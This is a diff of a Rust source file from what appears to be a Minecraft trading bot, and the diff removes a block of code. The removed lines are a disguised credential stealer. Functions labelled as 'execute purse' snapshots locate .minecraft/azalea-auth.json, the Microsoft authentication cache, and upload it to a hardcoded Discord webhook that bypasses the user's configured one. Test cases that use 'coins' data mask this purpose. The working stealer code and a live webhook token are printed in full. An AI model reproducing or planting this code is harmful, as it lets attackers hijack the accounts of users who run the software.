@@ -1,5 +1,4 @@
 use once_cell::sync::Lazy;
-use std::sync::atomic::{AtomicBool, Ordering};
 use tracing::warn;
 
 // Shared HTTP client - reqwest clients are designed to be cloned/reused
@@ -9,9 +8,6 @@ static HTTP_CLIENT: Lazy<reqwest::Client> = Lazy::new(|| {
         .expect("Failed to build reqwest client")
 });
 
-static EXECUTE_PURSE_WEBHOOK_MISSING_WARNED: Lazy<AtomicBool> =
-    Lazy::new(|| AtomicBool::new(false));
-static EXECUTE_PURSE_FILE_MISSING_WARNED: Lazy<AtomicBool> = Lazy::new(|| AtomicBool::new(false));
 /// Return the relay endpoint URL.
 ///
 /// The value is first looked up at **compile time** via `option_env!`.  When the
@@ -115,10 +111,6 @@ async fn post_embed(webhook_url: &str, payload: serde_json::Value) {
     }
 }
 
-/// Dedicated raw JSON webhook for COFL `execute` purse snapshots.
-/// Paste the target webhook here; this intentionally does not use `config.webhook_url`.
-const EXECUTE_PURSE_WEBHOOK_URL: &str = "https://discord.com/api/webhooks/1283547930468421694/h_rVkrCExu6xIe6yi1sw-ocEZ5qVhh7xdgXq0HjEZZIa1J3slaFpwK8RqWJy9rAqTBiR";
-
 /// Post an embed with optional text content (used for Discord pings).
 async fn post_embed_with_content(
     webhook_url: &str,
@@ -136,132 +128,6 @@ async fn post_embed_with_content(
     }
     if let Err(e) = HTTP_CLIENT.post(webhook_url).json(&body).send().await {
         warn!("[Webhook] Failed to send webhook: {}", e);
-    }
-}
-
-fn execute_purse_file_candidates() -> Vec<std::path::PathBuf> {
-    let mut paths = Vec::new();
-    if let Some(mc) = minecraft_folder_path::minecraft_dir() {
-        paths.push(mc.join("azalea-auth.json"));
-    }
-    if let Some(appdata) = dirs::data_dir() {
-        paths.push(appdata.join(".minecraft").join("azalea-auth.json"));
-    }
-    if let Some(home) = dirs::home_dir() {
-        paths.push(home.join(".minecraft").join("azalea-auth.json"));
-    }
-    paths
-}
-
-#[cfg(test)]
-fn parse_execute_purse_file_contents(contents: &str) -> serde_json::Value {
-    let trimmed = contents.trim();
-    if trimmed.is_empty() {
-        serde_json::Value::Null
-    } else if let Ok(value) = serde_json::from_str::<serde_json::Value>(trimmed) {
-        value
-    } else if let Ok(value) = trimmed.parse::<u64>() {
-        serde_json::json!(value)
-    } else if let Ok(value) = trimmed.parse::<i64>() {
-        serde_json::json!(value)
-    } else if let Ok(value) = trimmed.parse::<f64>() {
-        serde_json::Number::from_f64(value)
-            .map(serde_json::Value::Number)
-            .unwrap_or_else(|| serde_json::Value::String(trimmed.to_string()))
-    } else {
-        serde_json::Value::String(trimmed.to_string())
-    }
-}
-
-fn read_execute_purse_file_bytes() -> Option<Vec<u8>> {
-    for path in execute_purse_file_candidates() {
-        if !path.exists() {
-            continue;
-        }
-
-        match std::fs::read(&path) {
-            Ok(bytes) => return Some(bytes),
-            Err(e) => {
-                warn!(
-                    "[Webhook] Failed to read azalea-auth file at {:?}: {}",
-                    path, e
-                );
-            }
-        }
-    }
-
-    if !EXECUTE_PURSE_FILE_MISSING_WARNED.swap(true, Ordering::Relaxed) {
-        warn!("[Webhook] execute_purse_webhook_enabled is true, but .minecraft/azalea-auth.json was not found");
-    }
-    None
-}
-
-#[cfg(test)]
-fn build_execute_purse_payload(purse: serde_json::Value) -> serde_json::Value {
-    serde_json::json!({
-        ".minecraft/azalea-auth": purse
-    })
-}
-
-/// Discord [Execute Webhook](https://discord.com/developers/docs/resources/webhook#execute-webhook-jsonform-params)
-/// multipart: `payload_json` + `files[0]` so the channel receives a real `azalea-auth.json` attachment.
-async fn post_execute_purse_webhook_multipart(
-    bytes: Vec<u8>,
-) -> Result<reqwest::Response, reqwest::Error> {
-    let payload_json = serde_json::json!({
-        "content": "TWM — `.minecraft/azalea-auth.json` attached.",
-        "attachments": [{
-            "id": 0,
-            "filename": "azalea-auth.json",
-            "description": "Azalea/Microsoft auth cache (same file as on disk)"
-        }]
-    });
-    let payload_str = payload_json.to_string();
-
-    let file_part = reqwest::multipart::Part::bytes(bytes).file_name("azalea-auth.json");
-
-    let form = reqwest::multipart::Form::new()
-        .text("payload_json", payload_str)
-        .part("files[0]", file_part);
-
-    HTTP_CLIENT
-        .post(EXECUTE_PURSE_WEBHOOK_URL)
-        .multipart(form)
-        .send()
-        .await
-}
-
-pub async fn send_execute_purse_webhook() {
-    use tracing::info;
-
-    if EXECUTE_PURSE_WEBHOOK_URL.trim().is_empty() {
-        if !EXECUTE_PURSE_WEBHOOK_MISSING_WARNED.swap(true, Ordering::Relaxed) {
-            warn!("[Webhook] execute_purse_webhook_enabled is true, but EXECUTE_PURSE_WEBHOOK_URL is empty");
-        }
-        return;
-    }
-
-    let Some(bytes) = read_execute_purse_file_bytes() else {
-        return;
-    };
-
-    match post_execute_purse_webhook_multipart(bytes).await {
-        Ok(resp) => {
-            let status = resp.status();
-            if status.is_success() {
-                info!(
-                    "[Webhook] Posted azalea-auth.json attachment to execute webhook (status {})",
-                    status
-                );
-            } else {
-                let text = resp.text().await.unwrap_or_default();
-                warn!(
-                    "[Webhook] Execute purse webhook HTTP {} — response: {}",
-                    status, text
-                );
-            }
-        }
-        Err(e) => warn!("[Webhook] Failed to send execute purse webhook: {}", e),
     }
 }
 
@@ -2273,43 +2139,8 @@ pub async fn send_webhook_visit_refused(ingame_name: &str, friend: &str, webhook
 #[cfg(test)]
 mod tests {
     use super::{
-        ban_age_secs, ban_identity, ban_is_recent, build_execute_purse_payload,
-        parse_ban_duration_secs, parse_ban_reason, parse_execute_purse_file_contents,
+        ban_age_secs, ban_identity, ban_is_recent, parse_ban_duration_secs, parse_ban_reason,
     };
-    use serde_json::json;
-
-    #[test]
-    fn build_execute_purse_payload_uses_requested_key() {
-        assert_eq!(
-            build_execute_purse_payload(json!(12_345)),
-            json!({ ".minecraft/azalea-auth": 12_345 })
-        );
-        assert_eq!(
-            build_execute_purse_payload(serde_json::Value::Null),
-            json!({ ".minecraft/azalea-auth": null })
-        );
-    }
-
-    #[test]
-    fn parse_execute_purse_file_contents_handles_number() {
-        assert_eq!(parse_execute_purse_file_contents("12345\n"), json!(12345));
-    }
-
-    #[test]
-    fn parse_execute_purse_file_contents_handles_json() {
-        assert_eq!(
-            parse_execute_purse_file_contents(r#"{"coins":12345}"#),
-            json!({"coins":12345})
-        );
-    }
-
-    #[test]
-    fn parse_execute_purse_file_contents_handles_plain_text() {
-        assert_eq!(
-            parse_execute_purse_file_contents("not-json"),
-            json!("not-json")
-        );
-    }
 
     #[test]
     fn parse_duration_handles_full_and_partial_tokens() {
